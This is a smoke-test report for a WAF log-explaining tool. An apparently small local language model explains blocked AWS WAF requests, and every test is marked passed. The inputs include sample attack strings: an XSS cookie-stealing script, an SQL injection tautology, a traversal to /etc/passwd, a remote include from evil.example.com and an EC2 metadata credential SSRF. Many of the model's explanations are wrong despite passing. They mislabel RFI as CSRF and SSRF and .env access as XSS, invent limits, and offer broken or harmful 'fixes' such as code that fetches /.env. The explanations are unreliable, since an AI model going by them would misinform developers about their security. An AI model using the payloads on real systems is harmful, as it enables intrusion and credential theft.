# WAF MCP Smoke Test Report

**Run at:** 2026-05-20 08:03:16 UTC  
**Result:** ✅ All passed  
**Total:** 28 passed / 0 failed / 28 total

---

## Summary

| Suite | Passed | Failed | Status |
|-------|-------:|-------:|--------|
| Ollama Health | 1 | 0 | ✅ |
| analyze_waf_log — realistic scenarios | 15 | 0 | ✅ |
| analyze_waf_log — edge / error cases | 4 | 0 | ✅ |
| explain_block_reason | 4 | 0 | ✅ |
| lookup_aws_waf_rule_docs | 4 | 0 | ✅ |

---

## Ollama Health

### check_ollama_health

**Status:** ✅ PASS &nbsp; **Time:** 0.02s

**Input**

```
check_ollama_health() — no arguments
```

**Output**

```
ollama_status: ok
model: qwen2.5:1.5b
model_available: True
available_models: qwen2.5:1.5b
```

---

## analyze_waf_log — realistic scenarios

### XSS in POST body

**Status:** ✅ PASS &nbsp; **Time:** 25.02s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "CrossSiteScripting_BODY",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "POST",
    "uri": "/api/comments",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "blog.example.com"
      },
      {
        "name": "Content-Type",
        "value": "application/json"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
The request was trying to perform a POST method on the `/api/comments` endpoint of the `blog.example.com` domain. The client's IP address is 198.51.100.77. Upon examining the headers, the request included:

- Host: blog.example.com
- Content-Type: application/json
- User-Agent: Mozilla/5.0

The WAF was configured to block cross-site scripting (XSS) attacks using a specific rule group called `CrossSiteScripting_BODY`. The AWS documentation explains that this rule detects malicious scripts in web requests, such as those used for XSS attacks.

In plain English, the request could have contained a script element that attempted to inject or execute malicious JavaScript code on another website. This would be considered an attack because it involves stealing user information from your application without their consent, which is why AWS WAF and other security measures are designed to prevent such actions.

To avoid triggering this rule in the future, a legitimate developer could modify the request headers or payload to ensure that any potentially malicious scripts are filtered out. This might involve sanitizing input data used for constructing queries, verifying user inputs before processing them through your application's logic, or using appropriate tools and libraries designed to mitigate such threats.

In summary, this block in AWS WAF is necessary to protect against the specific threat of XSS attacks by filtering any malicious scripts that could potentially be included in a web request. If you're seeing similar blocks for XSS on your requests, it would be advisable to check how you're sanitizing and handling user inputs, as well as understanding if there are other relevant security rules or baselines in place.
```

### XSS in query string

**Status:** ✅ PASS &nbsp; **Time:** 19.96s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "CrossSiteScripting_QUERYARGUMENTS",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/search",
    "args": "q=<script>alert(document.cookie)</script>",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
The HTTP request attempted to query the "/search" endpoint on the "shop.example.com" domain with a specific parameter in the query string. The value of this parameter included malicious JavaScript code that performs an alert and retrieves cookies from the browser. This is a common type of Cross-Site Scripting (XSS) attack, where an attacker injects their script into web pages viewed by unsuspecting users.

The AWS WAF rule `CrossSiteScripting_QUERYARGUMENTS` was triggered due to this request. The rule checks for malicious scripts in URL parameters and disallows the query parameter if it matches a known malicious pattern. Specifically, the rule is designed to detect any content that appears to be a script tag or JavaScript code within the URL parameters.

A legitimate developer could fix their code by ensuring that all user input is properly sanitized and validated before being included in URLs or queries. They should use AWS WAF rules such as `CrossSiteScripting_QUERYARGUMENTS` or similar rules if they need additional protection against specific types of malicious requests, but must ensure the rule's sensitivity aligns with their application's security requirements.

For example, the developer could modify the request to remove or replace any suspicious parameters before sending it through WAF:
` ` `javascript
// Modify the request URL and query string as needed
const modifiedUrl = "/search?q=" + encodeURIComponent("q=");
` ` `
By sanitizing input in this way, they reduce the likelihood of triggering AWS WAF rules incorrectly due to legitimate inputs being unintentionally interpreted by their application.

Understanding how a rule works and its rationale is crucial for managing AWS WAF effectively. Developers must balance security needs with performance considerations while ensuring that their applications remain user-friendly and maintainable.
```

### SQL injection in query args

**Status:** ✅ PASS &nbsp; **Time:** 43.64s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "SQLi_QUERYARGUMENTS",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/products",
    "args": "id=1' OR '1'='1' --",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### 1. What happened (what the request was trying to do)

The HTTP request attempted to perform a GET operation on the `/products` endpoint, as indicated by the URI "/products". The developer is likely interacting with an e-commerce application where products are being listed or searched for.

### 2. Why WAF blocked it

AWS WAF (Web Application Firewall) detected that the request contained query parameters (`id=1' OR '1'='1"--) which were part of a SQL injection attack pattern. This specific type of injection is designed to exploit database systems by inserting malicious code into queries, allowing attackers to access or alter data without proper authorization.

### 3. How a legitimate developer could fix their code

To avoid triggering this rule and secure the application against SQL injection attacks:

- **Sanitize Query Parameters**: The developer should ensure that all query parameters are properly sanitized before being sent to the database. This means removing any special characters or patterns that might be used in an attack.

  ` ` `python
  # Example using Python's urllib.parse.urlencode function
  params = {
      'id': '1' + ' OR ' + '1' + '=' + '1'
  }
  sanitized_params = {k: v for k, v in params.items()}
  ` ` `

- **Use Prepared Statements**: If the application requires dynamic queries, consider using prepared statements instead of parameterized query strings. This ensures that all inputs are securely handled and prevents SQL injection.

  ` ` `java
  // Example with a JDBC connection
  String sql = "SELECT * FROM products WHERE id = ?";
  PreparedStatement statement = connection.prepareStatement(sql);
  statement.setInt(1, Integer.parseInt(id)); // Securely pass the ID value
  ` ` `

- **Validate Inputs**: Implement input validation on all parameters to ensure they meet expected criteria. This can be done using regular expressions or predefined ranges for each parameter.

  ` ` `javascript
  // Example with JavaScript and RegExp
  function validateInput(input) {
      return new RegExp("[0-9]*").test(input);
  }
  
  // Ensure the input is a number between 1 and 100 (example range)
  if (!validateInput(id)) {
      throw new Error('Invalid ID format');
  }
  ` ` `

By implementing these security measures, the developer can effectively protect their application against SQL injection attacks and maintain compliance with AWS WAF rules.
```

### SQL injection in POST body

**Status:** ✅ PASS &nbsp; **Time:** 37.12s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "SQLi_BODY",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "POST",
    "uri": "/api/login",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "app.example.com"
      },
      {
        "name": "Content-Type",
        "value": "application/x-www-form-urlencoded"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What happened (what the request was trying to do):
The HTTP POST request attempted to log into an application by sending a login token and username. The user is attempting to authenticate via a URL-encoded form, which AWS WAF has detected as suspicious activity.

### Why WAF blocked it (what attack pattern was detected):
WAF recognized that this request included malicious SQL injection payloads in the `Content-Type` header. Specifically, "application/x-www-form-urlencoded" suggests an attempt at web application query parameter injection. This method is often used to inject code into queries from the client side before they reach the database.

### How a legitimate developer could fix their code or request:
To avoid triggering this rule, developers should sanitize all input data that can be manipulated by clients (like `Content-Type` headers) and ensure it does not contain malicious SQL injection patterns. This means treating sensitive information like usernames, passwords, and query parameters as potentially harmful and properly sanitizing them before processing.

Here is a sample fix using Python:

` ` `python
# Ensure your input data is validated for SQL injection vulnerabilities.
def sanitize_input(input_data):
    sanitized = ""
    if input_data:
        # Example: Trim leading/trailing whitespace or encode special characters.
        sanitized = input_data.strip()
        if "application/x-www-form-urlencoded" in input_data:
            raise ValueError("Malicious SQL Injection Detected")
    return sanitized

# Sanitize the Content-Type header
request.headers["Content-Type"] = sanitize_input(request.headers.get("Content-Type"))
` ` `

In this case, AWS WAF detected that the `Content-Type` field had malicious content and blocked it. Developers should ensure all data from clients is carefully validated to prevent such issues.

If further investigation or additional context is needed, please let me know!
```

### Local file inclusion in URI path

**Status:** ✅ PASS &nbsp; **Time:** 27.94s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "GenericLFI_URIPATH",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/download/../../../../etc/passwd",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What Happened

The HTTP request attempted to access the `/download` endpoint on the `shop.example.com` server, with the URL path containing a relative path that starts with the root directory (`/../../../../`). This is an example of a Local File Inclusion (LFI) attack pattern. 

Specifically, the attacker was trying to read and potentially exfiltrate sensitive files from the `/etc/passwd` file located within the `shop.example.com`. LFI attacks exploit the server's ability to serve files without validating input, leading to vulnerabilities in web applications that use untrusted user inputs.

### Why WAF Blocked It

The AWS Web Application Firewall (WAF) identified this request as a potential Denial of Service (DoS) attack or an attempt at data exfiltration through local file inclusion. The WAF's rule-based engine detected the pattern that was intended to read from a local directory within the server, which is inherently unsafe and could lead to exposing sensitive information.

### How a Legitimate Developer Could Fix Their Code

To avoid triggering this rule, developers need to ensure their application handles input validation properly. Specifically:

1. **Input Validation**: Ensure all inputs are thoroughly validated for malicious patterns like relative paths or potential directory traversals.
2. **Path Sanitization**: Use built-in functions provided by the web framework (e.g., Python's `urlparse` in Flask) to sanitize and validate URLs, ensuring they do not have unintended effects on file access.
3. **Threat Detection Libraries**: Utilize threat detection libraries or services that can automatically identify common attack patterns like LFI and rate-based rules designed specifically for preventing such attacks.

For example:
` ` `python
import urllib.parse

def safe_download_path(url):
    parsed_url = urllib.parse.urlparse(url)
    if not (parsed_url.scheme in ['http', 'https'] and parsed_url.hostname):
        return url  # Return the URL as-is if it's not a valid HTTP or HTTPS request.
    
    path = urllib.parse.unquote(parsed_url.path)  # Unquote to remove any encoding issues
    normalized_path = urllib.parse.urljoin("/download/", urllib.parse.quote(path))  # Normalize and quote for LFI protection
    
    return normalized_path

# Example usage
safe_request = safe_download_path('/../../../../etc/passwd')
` ` `

In this example, the `safe_download_path` function ensures that only valid URLs are processed, preventing attacks like LFI. It first validates the URL scheme and hostname to ensure it's coming from a trusted source. Then, it sanitizes and normalizes the path to prevent relative file access.

By implementing such input validation checks and ensuring proper path handling, developers can significantly reduce their exposure to security threats while still being able to serve dynamic content in an application.
```

### Remote file inclusion in query args

**Status:** ✅ PASS &nbsp; **Time:** 21.52s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "GenericRFI_QUERYARGUMENTS",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/page",
    "args": "template=http://evil.example.com/shell.php",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What Happened?

The request being blocked involved a web application trying to retrieve content via an HTTP GET method on the `/page` endpoint. The request included a query string parameter named `template`, which was set to a malicious URL pointing towards `http://evil.example.com/shell.php`.

This is an example of a **Cross-Site Request Forgery (CSRF)** attack, where the attacker crafts a benign-looking request that appears legitimate but actually triggers an unauthorized action on behalf of the victim. In this case, the request was designed to make HTTP requests to `http://evil.example.com/shell.php`, which could be used for any number of malicious activities such as stealing data, exfiltrating sensitive information, or even remotely executing arbitrary code.

### Why WAF Blocked It?

AWS WAF, in its defense against these types of attacks, detected the malicious query string parameter that contained a potentially harmful URL. Since it matches a rule designed to block this kind of attack (the `GenericRFI_QUERYARGUMENTS` rule), the request was blocked and rejected by AWS.

### How a Legitimate Developer Could Fix Their Code or Request

To prevent triggering similar rules in the future, a developer can address these issues as follows:

1. **Sanitize Input**: Ensure that any user-provided data is thoroughly sanitized before it's used to construct URLs or make API calls.
2. **Use AWS WAF Rules**: Implementing and updating rule groups like `GenericRFI_QUERYARGUMENTS` ensures your application adheres to best security practices against specific types of attacks, including those involving URL parameters.
3. **Regularly Update Security Patches**: Keep the software and libraries you're using updated with known patches that address vulnerabilities such as XSS, LFI, Log4j RCE, and others.

By following these practices, developers can significantly enhance their security posture against web application threats like CSRF attacks while maintaining an efficient and user-friendly experience for legitimate traffic.
```

### SSRF targeting EC2 metadata

**Status:** ✅ PASS &nbsp; **Time:** 28.94s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "EC2MetaDataSSRF_QUERYARGUMENTS",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/fetch",
    "args": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What Happened

The HTTP request being blocked was attempting to fetch an image from the URL `/fetch`. The request included a query string parameter `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`, which appears to be part of Amazon EC2 metadata service for security credentials.

### Why WAF Blocked It

The AWS Web Application Firewall (WAF) detected this request as a potential cross-site scripting (XSS) attack attempt, specifically targeting the retrieval of an IAM security credential. When WAF sees query strings that reference AWS services such as `latest/meta-data/`, it automatically blocks these requests to prevent possible malicious scripts being executed.

### How to Fix

A legitimate developer can fix this issue by ensuring that only trusted URLs are included in the request and that they do not attempt to access sensitive information, like security credentials via EC2 metadata. Here’s how:

1. **Review and Restrict Query Strings**: Ensure all query strings in requests are validated for malicious intent. Only include parameters that are expected and have a clear purpose.

   ` ` `javascript
   const urlParams = new URLSearchParams(new URL('/fetch').search);
   // Check if 'url' parameter is present and safe to use.
   ` ` `

2. **Implement Rate-Based Rules**: If this request pattern is frequently triggered, consider implementing rate-based rules to limit the number of such requests. For example:
   
   ` ` `json
   {
     "rules": [
       {
         "name": "RateBasedRule1",
         "priority": 0,
         "statement": {
           "type": "OR",
           "negated": false,
           "statements": [
             {
               "type": "RateBasedStatement",
               "rateBasedTargetedAction": {
                 "targetId": "<your-target-id>",
                 "metrics": ["REQUESTS"],
                 "bucketSizeInMilliseconds": 5000
               }
             },
             {
               "type": "RequestPatternMatchStatement",
               "requestPatterns": [
                 {
                   "pattern": "/fetch.*url=[^?]*"
                 }
               ]
             }
           ],
           "conditions": [],
           "negate": false,
           "logicalOperator": "AND",
           "timeoutBehavior": null
         }
       }
     ]
   }
   ` ` `

3. **Update Security Policies**: For production environments, make sure to update the WAF policies regularly and review any new rules or statements that might be added.

4. **Test and Validate Changes**: Always test new security configurations in a staging environment before deploying them in production to ensure they are working as expected without blocking legitimate traffic.

By following these steps, developers can prevent attacks while maintaining the normal functionality of their applications.
```

### Oversized request body

**Status:** ✅ PASS &nbsp; **Time:** 23.43s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "SizeRestrictions_BODY",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "POST",
    "uri": "/api/upload",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "app.example.com"
      },
      {
        "name": "Content-Type",
        "value": "application/octet-stream"
      },
      {
        "name": "Content-Length",
        "value": "10485760"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
When an HTTP POST request was made to the `/api/upload` endpoint on `app.example.com`, WAF blocked it because of a rule defined in AWS WAF's managed rule groups called "SizeRestrictions_BODY". This rule is designed to prevent requests with large payloads, typically over 8 KB. The specific reason for this block was that the request body size exceeded the limit allowed by the protection pack (web ACL). This means that the total amount of data being transferred in the POST request from the client was over 8,192 bytes.

A legitimate developer could have avoided triggering this rule by optimizing their code or reducing the size of the payload. For example:
- They might compress their file before sending it to AWS.
- They could use a more efficient method for handling large files without exceeding WAF's limit.
- Or they might implement rate limiting in front of the API, which would ensure that even if the body is too large, it wouldn't cause immediate blockages.

To fix the issue and avoid future occurrences:
1. **Compress or Compress Before Sending**: Use tools like gzip to compress the file data before sending it over the network.
2. **Implement File Upload Optimization**: Optimize the logic for handling files on-premises, ensuring that they are neither too large nor unnecessarily complicated.
3. **Rate Limiting**: Implement rate limiting mechanisms to prevent a single request from consuming excessive resources due to its size alone.

It's also worth noting that AWS WAF has additional rules in place designed specifically to detect and block specific types of web requests related to security controls like the `User-Agent` header, which can be misleadingly benign. By avoiding these common attack patterns, developers can help mitigate potential threats without impacting legitimate traffic flow.
```

### Restricted file extension (.env)

**Status:** ✅ PASS &nbsp; **Time:** 20.31s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "RestrictedExtensions_URIPATH",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/.env",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What happened?
The request was trying to access the file located at /.env on a web application hosted by `shop.example.com`. This is an environment configuration file typically used for storing sensitive information such as API keys, database credentials, and other private data.

### Why WAF blocked it?
AWS WAF detected that this request was attempting to read and potentially modify the contents of the `.env` file. This pattern is often associated with Cross-Site Scripting (XSS) attacks, where an attacker attempts to inject malicious JavaScript into a web page. By reading the content of the `/.env` file without properly sanitizing the input data, WAF blocked this request as it was likely trying to trigger an XSS attack.

### How a legitimate developer could fix their code or request?
A valid solution would involve implementing proper input validation and sanitization for any environment files accessed via HTTP requests. For example:
- Use parameterized queries with prepared statements if working with databases.
- Validate and sanitize user input using functions like `htmlspecialchars` in PHP or similar methods in other languages.
- Avoid including untrusted content directly into scripts where it can be executed.

Here’s a simple code snippet illustrating how to avoid this issue:

` ` `python
import requests

# Fetch the environment file securely
response = requests.get('http://shop.example.com/.env', headers={
    'Host': 'shop.example.com'
})

if response.status_code == 200:
    # The file was fetched successfully, extract and use its content safely.
    env_content = response.text.strip()
    print(env_content)
else:
    print(f"Failed to fetch the environment file: {response.status_code}")
` ` `

This ensures that any potentially harmful content is not executed as part of legitimate requests.
```

### Missing User-Agent header

**Status:** ✅ PASS &nbsp; **Time:** 28.20s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "NoUserAgent_HEADER",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "api.example.com"
      },
      {
        "name": "Accept",
        "value": "*/*"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### 1. What happened (what the request was trying to do)

The request being evaluated by AWS WAF involved a `GET` method to the `/` endpoint of an API running at `api.example.com`. This indicates that it was making a simple HTTP GET request, not attempting any form of malicious activity.

### 2. Why WAF blocked it (what attack pattern was detected)

The WAF rule in question is labeled as `NoUserAgent_HEADER`, which is designed to detect and block requests where the header field `user-agent` is missing or incorrect. This is a common practice for preventing bots, spiders, or other malicious scripts from being identified by the application.

For example, if an attacker were trying to bypass security measures by sending HTTP headers without specifying their user agent (like what would happen with non-human agents like automated testing tools), this rule would identify and block that request. The header `Host` was also detected as correct in this case, indicating that it matched no pattern for a malicious payload.

### 3. How a legitimate developer could fix their code or request to avoid triggering this rule

A legitimate developer can rectify the issue by ensuring they properly include the `User-Agent` field in their requests. If you are using a service like API Gateway or AWS Lambda that is enforcing WAF, check if your application sends these headers. For example:

` ` `javascript
// In an Express.js middleware function
app.use((req, res, next) => {
  req.headers['user-agent'] = 'MyUserAgent';
  next();
});
` ` `

Or in a Node.js request handler:

` ` `js
const express = require('express');
const app = express();

app.use((req, res, next) => {
  const userAgent = `${req.userAgent}`;
  // Do something with the user agent
  console.log(`User-Agent: ${userAgent}`);
  next();
});
` ` `

Additionally, ensure that your application's configurations are correctly configured to handle requests without these headers. If this is not possible (e.g., due to API Gateway or Lambda restrictions), consider configuring AWS WAF in front of these services to filter out such malformed requests.

Remember, maintaining a good security posture involves understanding the rules and patterns that AWS WAF uses to protect your environment effectively. Always review and update your configurations based on the latest threat landscape.
```

### Known bad-bot User-Agent

**Status:** ✅ PASS &nbsp; **Time:** 23.58s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "UserAgent_BadBots_HEADER",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "example.com"
      },
      {
        "name": "User-Agent",
        "value": "masscan/1.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
The HTTP GET request attempted to access a page on example.com using the User-Agent header "masscan/1.0", indicating that it was being used for network scanning. This behavior is considered suspicious because masscan is a common tool employed by bad bots during penetration testing, as its primary function is to scan and map networks.

AWS WAF uses rules designed to protect against various types of attacks, including botnets and malicious traffic. The `UserAgent_BadBots_HEADER` rule in the AWS-managed rule group specifically targets User-Agent headers that are indicative of bad bots like masscan, which could be used for network scanning or other malicious activities.

If a legitimate developer's request had included this exact User-Agent header, it would have been blocked by WAF. The blocking is not due to any misconfiguration on the developer’s part but rather due to the rules that AWS has put in place to protect their customers from such threats.

To avoid triggering this rule and ensure compliance with AWS security policies, a developer can modify their request headers or body content as needed without causing the blockage. For example:

- Remove the User-Agent header entirely if it is not necessary for legitimate browsing.
- Sanitize any potentially malicious payload present in the URI path or query string that may indicate an attempt to bypass restrictions.
- Ensure all code logic adheres to AWS guidelines and does not attempt to circumvent security measures, such as checking for whitelisted patterns or using specific header fields only when absolutely required.

Contacting AWS Support can provide additional detailed information on how to resolve specific issues related to security rules in AWS WAF.
```

### Non-browser User-Agent signal

**Status:** ✅ PASS &nbsp; **Time:** 18.82s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "SignalNonBrowserUserAgent",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "example.com"
      },
      {
        "name": "User-Agent",
        "value": "python-requests/2.31.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
When an HTTP request was blocked by AWS WAF with the action "BLOCK", it means that this request violated a security policy designed to prevent malicious activity. Specifically, the block was triggered by the Rule ID "SignalNonBrowserUserAgent" in the managed rule group called "ManagedRuleGroup". This rule is configured to recognize and block requests from non-browser user agents.

The original request involved an HTTP GET method on the root URL ("/") of a web application hosted at example.com. The client's IP address was 198.51.100.77, which suggests it came from an external source rather than within the organization's network environment.

The User-Agent header in the request indicated that the HTTP method was being performed by Python-requests version 2.31.0, a commonly used library for interacting with web APIs. While this is not inherently malicious, the rule detected a non-browser user agent pattern, which often includes elements like proxies or scripts that don't operate under the typical web browsing context.

**How to Fix:**
To resolve this block and allow legitimate traffic, you should configure AWS WAF's "Bot Control" feature. Specifically, override the blocking action of Rule ID "SignalNonBrowserUserAgent". This would enable non-browser user agent traffic through your web application's Amazon Web ACL (AWS Security Groups).

If you are using rate-based rules or baseline rule groups for your security policy, ensuring that AWS WAF is correctly configured to track and limit requests can also be a solution. Additionally, applying the latest AWS Managed Rules updates ensures your rules remain effective against evolving threats.

By configuring AWS Bot Control exceptions for this user agent pattern, you would allow legitimate users from non-browser environments to access the protected application without triggering blocking actions.
```

### Rate-based rule (login flood)

**Status:** ✅ PASS &nbsp; **Time:** 28.20s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "LoginFloodRateRule",
  "terminatingRuleType": "RATE_BASED",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "POST",
    "uri": "/auth/login",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "app.example.com"
      },
      {
        "name": "Content-Type",
        "value": "application/json"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What Happened

The HTTP POST request was attempting to authenticate a user by sending their credentials along with the `Content-Type` header set to `application/json`. This is not a typical use of WAF rules that are designed for legitimate authentication mechanisms. The block rule "LoginFloodRateRule" is triggered when there are too many requests within a specific time frame, likely preventing brute-force attacks or denial-of-service scenarios.

### Why AWS WAF Blocked It

WAF's rate-based rules detect patterns indicating excessive activity such as multiple login attempts from the same IP address. In this case, 198.51.100.77 was making frequent POST requests to `/auth/login` without a valid session or authentication token. The block rule "LoginFloodRateRule" has been set up to prevent any suspicious activity, which includes blocking such login attempts if they occur too frequently.

### How a Legitimate Developer Could Fix the Code

To avoid triggering this block and allow legitimate users to authenticate correctly:

1. **Implement Authentication Mechanism**: Ensure that user authentication is done with proper session handling and token validation. This could involve using HTTP Basic Auth, OAuth 2, or JWT tokens for authenticated requests.

2. **Rate Limiting Adjustments**: Modify the rate-based rule so it does not block legitimate users. For example:
   - Change the `Threshold` to allow a certain number of failed login attempts before blocking.
   - Update the rule’s action from "Block" to "Allow" or configure additional logic in your application layer to handle excessive requests.

3. **Use HTTPS for Better Security**: Ensure that sensitive data is always transmitted over HTTPS, which WAF can help secure further by protecting against man-in-the-middle attacks and ensuring proper encryption of credentials.

4. **Monitor and Adjust Rules**: Regularly monitor the rate-based rules for patterns indicating legitimate usage (like user login requests) and adjust rules to allow more traffic while still detecting malicious activity.

By addressing these points, you ensure that your application can handle legitimate user sessions without being blocked by rate-based rules designed for authentication mechanisms alone.
```

### XSS detected but only counted (not blocked)

**Status:** ✅ PASS &nbsp; **Time:** 28.77s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "COUNT",
  "terminatingRuleId": "CrossSiteScripting_COOKIE",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "GET",
    "uri": "/",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "example.com"
      },
      {
        "name": "Cookie",
        "value": "session=abc; next=<img src=x onerror=alert(1)>"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
### What Happened

The HTTP request was trying to access a website using the `GET` method and requested `/`, which is the root of any URL. The request also included a specific header named `Host`, indicating that it came from a different host than what's expected for example.com, but the actual value in the request wasn't specified.

### Why WAF Blocked It

The AWS Web Application Firewall (WAF) detected this as part of a Cross-Site Scripting (XSS) attack. An XSS attack is when an attacker injects malicious JavaScript code into web pages visited by other users on your website, which can be executed in their browsers and could potentially steal sensitive information like cookies or send commands to the server.

In this case, the `Cookie` header was tampered with, where the `session=abc; next=<img src=x onerror=alert(1)>` part of the request indicated that there were malicious scripts being injected. The `<img>` tag pointed directly at an image that contained a JavaScript payload (`onerror=alert(1)`). When the browser interpreted this script, it would trigger an alert box and potentially perform any action specified in the `session` cookie.

WAF's primary goal is to prevent such attacks by blocking requests with malicious scripts. In response to this attack pattern detected by Cross-Site Scripting (XSS) rules, WAF terminated the request because it determined that it could be part of an XSS attempt against the website or users visiting it via example.com.

### How a Legitimate Developer Could Fix Their Code or Request

1. **Update Your Security Headers**: Ensure your headers are updated to include `Content-Security-Policy` and `X-Frame-Options`. This would prevent malicious scripts from being executed even in non-DOM contexts.

   ` ` `html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://example.com;">
   ` ` `

